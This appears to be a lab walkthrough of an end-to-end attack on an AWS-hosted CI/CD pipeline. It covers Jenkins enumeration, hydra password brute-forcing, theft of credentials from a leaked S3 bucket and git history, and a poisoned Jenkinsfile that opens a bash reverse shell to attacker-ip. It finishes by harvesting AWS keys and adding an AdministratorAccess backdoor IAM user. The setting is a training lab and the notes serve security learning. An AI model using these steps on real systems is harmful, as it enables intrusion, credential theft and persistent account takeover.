# AWS Cloud Attack

[OWASP Top 10 Risks for CI/CD Pipeline](https://owasp.org/www-project-top-10-ci-cd-security-risks/)

* CICD-SEC-1: [Insufficient Flow Control Mechanisms](https://owasp.org/www-project-top-10-ci-cd-security-risks/)
* CICD-SEC-2: [Inadequate Identity and Access Management](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-02-Inadequate-Identity-And-Access-Management)
* CICD-SEC-3: [Dependency Chain Abuse](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-03-Dependency-Chain-Abuse)
* CICD-SEC-4: [Poisoned Pipeline Execution (PPE)](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-04-Poisoned-Pipeline-Execution)
* CICD-SEC-5: [Insufficient PBAC (Pipeline-Based Access Controls)](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-05-Insufficient-PBAC)
* CICD-SEC-6: [Insufficient Credential Hygiene](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-06-Insufficient-Credential-Hygiene)
* CICD-SEC-7: [Insecure System Configuration](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-07-Insecure-System-Configuration)
* CICD-SEC-8: [Ungoverned Usage of 3rd Party Services](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-08-Ungoverned-Usage-of-3rd-Party-Services)
* CICD-SEC-9: [Improper Artifact Integrity Validation](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-09-Improper-Artifact-Integrity-Validation)
* CICD-SEC-10: [Insufficient Logging and Visibility](https://owasp.org/www-project-top-10-ci-cd-security-risks/CICD-SEC-10-Insufficient-Logging-And-Visibility)

## Glossar

Poisoned Pipeline Execution (PPE) is when an attacker gains control of the build/deploy script, potentially leading to a reverse shell or secret theft.

Insufficient Pipeline-Based Access Controls (PBAC) means the pipeline lacks proper protection of secrets and sensitive assets, which can lead to compromise.

Insufficient Credential Hygiene refers to weak controls over secrets and tokens, making them vulnerable to leaks or escalation.

Dependency Chain Abuse occurs when a malicious actor tricks the build system into downloading harmful code, either by hijacking an official dependency or creating similarly named packages.

Insufficient Pipeline-Based Access Controls means pipelines have excessive permissions, making systems vulnerable to compromise.

Insecure System Configuration involves misconfigurations or insecure code in pipeline applications.

Improper Artifact Integrity Validation allows attackers to inject malicious code into the pipeline without proper checks.

## Lab Details

```plaintext
Compenents
Gitea       git.offseclab.io
Jenkins     automation.offseclab.io
Application app.offseclab.io
```

Attacker (public cloud)

```shell
# get network connections
nmcli connection

# set private DNS
sudo nmcli connection modify "Wired connection 1" ipv4.dns "<DNS-IP>,8.8.8.8"
sudo systemctl restart NetworkManager

#verify
cat /etc/resolv.conf
nslookup git.offseclab.io

# uset private DNS finally
sudo nmcli connection modify "Wired connection 1" ipv4.dns "8.8.8.8"
sudo systemctl restart NetworkManager
```

## From Leaked Secrets lead to Jenkins Pipeline Poisoning

Scenario

* Enum public AWS hostest CI/CD pipeline with Jenkins buildserver, Git repo and App
* Find AWS S3 bucket address in the App source code
* Download S3 bucket content to steal Git credentials
* Get **initial access** to Git repo
* Enum Git Repo using the Git credentials
* Modify pipeline Jenkinsfile to spawn a reverse shell
* Get **initial access** to Jenkins buildserver
* Find AWS cloud user credentials in Jenkins environment variables
* Enum AWS cloud user to understand roles and policies attached to the user
* Finally, add AWS cloud backdoor user with role "AdministratorAccess"
* Get **persistence** on compromised AWS account

### Enum public AWS hostest CI/CD pipeline with Jenkins buildserver, Git repo and App

* Enum Jenkins buildserver using metasploit plugin `jenkins_enum`
* Found version 2.385 -> Search for public exploits later

```shell
firefox automation.offseclab.io

sudo msfdb init
msfconsole --quiet

# use metasploit jenkins plugin
use auxiliary/scanner/http/jenkins_enum
show options

# default target URI is /jenkins
set RHOSTS automation.offseclab.io
set TARGETURI /
run

  [+] <TARGET-IP>:80      - Jenkins Version 2.385
  [*] /script restricted (403)
  [*] /view/All/newJob restricted (403)
  [*] /asynchPeople/ restricted (403)
  [*] /systemInfo restricted (403)
  [*] Scanned 1 of 1 hosts (100% complete)
  [*] Auxiliary module execution completed

# use go buster to find more directories
gobuster dir -u <target-ip> -w /usr/share/wordlists/dirb/common.txt -t 4
```

* Enum Git repo to get users names
* Guess user passwords using `hydra` (be aware of CSRF token)

```shell
firefox git.offseclab.io

# Guess user password using brute force attack
# Find incorrect user login message
hydra -L /tmp/user-names.txt -P /usr/share/wordlists/rockyou.txt git.offseclab.io http-post-form "/user/login:_csrf=mOJ1qnfH_EyzW8yd05E12jmc-Dg6MTc2MzM5Nzc3NzQ2MTg3NDcwOQ&user_name=^USER^&password=^PASS^:incorrect" 

# Login into Git accout to get user details 
{
  "login": "user",
  "email": "user@offseclab.io",
  "avatar_url": "https://secure.gravatar.com/avatar/339da0631f49cd954db4143676990f06?d=identicon",
  "language": "en-US",
  "is_admin": false,
  "last_login": "2025-11-17T17:21:15Z",
  "created": "2025-11-17T15:59:08Z",
  "restricted": false,
  "active": true,
}
```

* Enum Web App for common folders using `dirb` or `gobuster`
* Find S3 bucket reference in App source code using `curl -s`
* Enum S3 bucket for common folders
* Found Git repo on public S3 bucket

```shell
firefox http://app.offseclab.io

# Find common folders on the web app
dirb http://app.offseclab.io /usr/share/wordlists/dirb/common.txt

# Download source code
curl -s app.offseclab.io

# Enum S3 bucket for common folders
dirb https://staticcontent-lgudbhv8syu2tgbk.s3.us-east-1.amazonaws.com ./dirb-common-first50.txt
+ https://staticcontent-4rbihrg6qtl7051b.s3.us-east-1.amazonaws.com/.git/HEAD (CODE:200|SIZE:23)
```

### Download S3 bucket content to steal Git credentials

* Configure attacker profile to use `aws` API
* List S3 bucket content using `aws s3 ls`
* Download full S3 bucket content using `aws s3 sync`

```shell
aws configure --profile attacker
AWS Access Key ID []: AK
AWS Secret Access Key []: asdf...

#List S3 bucket content
aws --profile attacker s3 ls staticcontent-4rbihrg6qtl7051b
                           PRE .git/
                           PRE images/
                           PRE scripts/
                           PRE webroot/
2025-11-17 16:59:11        972 CONTRIBUTING.md
2025-11-17 16:59:11         79 Caddyfile
2025-11-17 16:59:11        407 Jenkinsfile
2025-11-17 16:59:11        879 README.md
2025-11-17 16:59:11        176 docker-compose.yml

# Download full S3 bucket content
mkdir s3bucket
aws --profile attacker s3 cp s3://staticcontent-lgudbhv8syu2tgbk/README.md ./s3bucket/
aws --profile attacker s3 sync s3://staticcontent-lgudbhv8syu2tgbk ./s3bucket/

# Search files and folders for credentials
cat s3bucket/scripts/upload-to-s3.sh

SCRIPT_DIR=$( cd -- "$( dirname -- "${BASH_SOURCE[0]}" )" &> /dev/null && pwd )
AWS_PROFILE=prod aws s3 sync $SCRIPT_DIR/../ s3://staticcontent-4rbihrg6qtl7051b/

cat -n s3bucket/scripts/update-readme.sh
...
  username=$1
  password=$2

  auth_header=$(printf "Authorization: Basic %s\n" "$(echo -n "$username:$password" | base64)")
  USERNAMES=$(curl -X 'GET' 'http://git.offseclab.io/api/v1/repos/Jack/static_content/collaborators' -H 'accept: application/json' -H $auth_header | jq .\[\].username |  tr -d '"')
```

### Get **initial access** to Git repo

* Search files and folders for credentials with `gitleak detect`
* Search for credentials in git log with `git log -p`
* Find Jenkinsfile pipeline with aws_key access

We find that credentials named "aws_key" are loaded here. This will set the environment variables AWS_ACCESS_KEY_ID for the access key ID, AWS_SECRET_ACCESS_KEY for the secret key, and AWS_DEFAULT_REGION for the region.

```shell
# Search for leaked credentials
cd s3bucket
gitleaks detect

# Search git log for credentials
git log
git log -p scripts/update-readme.sh  
echo -n "abCDeF" | base64 -d
administrator:securepassword  
```

### Enum Git Repo using the Git admin credentials

```shell
# Find Jenkinsfile pipeline with aws_key access
mkdir clone && cd clone
git clone http://git.offseclab.io/adminuser/image-transform

cat image-transform/Jenkinsfile

stage('Create Stack') {
  steps {
    withAWS(region:'us-east-1', credentials:'aws_key') {
      cfnUpdate(
        stack:'image-processor-stack', 
        file:'image-processor-template.yml', 
        params:[
          'OriginalImagesBucketName=original-images-lgudbhv8syu2tgbk',
          'ThumbnailImageBucketName=thumbnail-images--lgudbhv8syu2tgbk'
        ], 
        timeoutInMinutes:10, 
        pollInterval:1000)
}
```

### Modify pipeline Jenkinsfile to spawn a reverse shell

* Listen for incoming connections on kali linux using `apache` and `nc`
* Modify Jenkinsfile to spawn a reverse shell using `bash -i >& /dev/tcp/attacker-ip/4242 0>&1`

Attacker

```shell
# Get public IP and start nc listener
ip address
nc -nlvp 4242
```

Victim

```shell
cat image-transform/Jenkinsfile
pipeline {

  agent any
  stages {
    stage('Send Reverse Shell') {
      steps {
        withAWS(region: 'us-east-1', credentials: 'aws_key') {
          script {
            if (isUnix()) {
              sh 'curl http://attacker-ip/probe.html'
              sh 'bash -c "bash -i >& /dev/tcp/attacker-ip/4242 0>&1" & '
            }
          }
        }
      }
    }
  }
}

git commit -a -m "Send Reverse Shell implant"
git push
```

### Get **initial access** to Jenkins buildserver

```shell
Listening on 0.0.0.0 4242
Connection received on TARGET-IP PORT

~/agent/workspace/image-transform$ 
whoami
jenkins
```

### Find AWS cloud user credentials in Jenkins environment variables

```shell
# Enumerate Jenkins buildserver
uname -a
cat /etc/*release
cat /proc/mounts

# Found AWS account key and secret
env | grep AWS
AWS_DEFAULT_REGION=us-east-1
AWS_REGION=us-east-1
AWS_SECRET_ACCESS_KEY=asfd1234...
AWS_ACCESS_KEY_ID=AKIU...
```

### Enum AWS cloud user to understand roles and policies attached to the user

* Enum current user and list user policy `aws iam list-user-policies`
* Find user roles policy has privileged permissions `aws iam get-user-policy`

```shell
aws configure --profile compromised
AWS Access Key ID []: AKIU...
AWS Secret Access Key []: asfd1234...

# Enum AWS cloud account
aws --profile compromised sts get-caller-identity
{
    "UserId": "AID...",
    "Account": "123456789012",
    "Arn": "arn:aws:iam:123456789012:user/system/jenkins-admin"
}
                                                                                                                             
aws --profile compromised iam list-user-policies --user-name jenkins-admin
{
    "PolicyNames": [
        "jenkins-admin-role"
    ]
}

# Found AWS user policy with privileged permissions
aws --profile compromised iam get-user-policy --user-name jenkins-admin --policy-name jenkins-admin-role
{
    "UserName": "jenkins-admin",
    "PolicyName": "jenkins-admin-role",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Action": "*",
                "Effect": "Allow",
                "Resource": "*"
            }
        ]
    }
}
```

### Finally, add AWS cloud backdoor user with role "AdministratorAccess"

* Add backdoor user and attach AdministratorAccess policy using `aws iam create-user` and `aws iam attach-user-policy`
* Create AWS access key for backdoor user for persistence using `aws iam create-access-key`

```shell
# Add backdoor user and attach AdministratorAccess policy
aws --profile compromised iam create-user --user-name backdoor
{
    "User": {
        "Path": "/",
        "UserName": "backdoor",
        "UserId": "AIDSome...",
        "Arn": "arn:aws:iam::123456789012:user/backdoor",
        "CreateDate": "2025-11-18T11:23:01+00:00"
    }
}            
aws --profile compromised iam attach-user-policy  --user-name backdoor --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
                                                                                                                             
# Create AWS access key for backdoor user for persistence
aws --profile CompromisedJenkins iam create-access-key --user-name backdoor  
{
    "AccessKey": {
        "UserName": "backdoor",
        "AccessKeyId": "AKIA7890...",
        "Status": "Active",
        "SecretAccessKey": "Oabcd...",
        "CreateDate": "2025-11-18T11:24:09+00:00"
    }
}
```

### Get **persistence** on compromised AWS account

* Configure backdoor profile
* Verify backdoor persistence

```shell
aws configure --profile backdoor
AWS Access Key ID []: AKIA7890...
AWS Secret Access Key []: Oabcd...

# stealth verifications of backdoor acount
aws --profile attacker sts get-access-key-info --access-key-id  AKIA7890...
```
